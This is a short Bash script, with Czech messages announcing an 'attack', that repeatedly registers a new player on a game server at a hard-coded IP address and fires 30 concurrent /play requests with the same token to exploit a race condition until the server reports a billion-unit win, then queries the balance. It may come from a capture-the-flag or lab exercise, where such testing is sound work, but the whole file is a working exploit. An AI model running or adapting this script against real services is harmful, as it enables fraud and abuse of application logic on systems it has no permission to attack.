#!/bin/bash


URL="http://16.16.166.62:3000"
CONCURRENT_REQUESTS=30

echo "Spouštím útok..."


while true; do
    echo "-----------------------------------"
    echo "Registruji nového hráče..."

    TOKEN=$(curl -s "$URL/register" | awk '{print $9}')

    if [ -z "$TOKEN" ]; then
        echo "Chyba při registraci, zkouším znovu za 1s..."
        sleep 1
        continue
    fi

    echo "Získán token: $TOKEN"
    echo "Posílám $CONCURRENT_REQUESTS souběžných požadavků..."
    for i in $(seq 1 $CONCURRENT_REQUESTS); do
        if [ $i -eq $CONCURRENT_REQUESTS ]; then
            curl -s -H "Authorization: $TOKEN" "$URL/play" > output.txt &
        else
            curl -s -H "Authorization: $TOKEN" "$URL/play" > /dev/null &
        fi
    done

    wait

    echo "Požadavky dokončeny."

    if grep -q "Congratulations" output.txt; then
        echo ""
        echo "🎉 ÚSPĚCH! 🎉"
        echo "Miliarda získána!"
        cat output.txt

        echo ""
        echo "Kontrolní 'balance' dotaz:"
        curl -s -H "Authorization: $TOKEN" "$URL/balance"

        break
    else
        echo "Nevyhráli jsme. Zkouším znovu..."
        rm output.txt
    fi
    sleep 0.5
done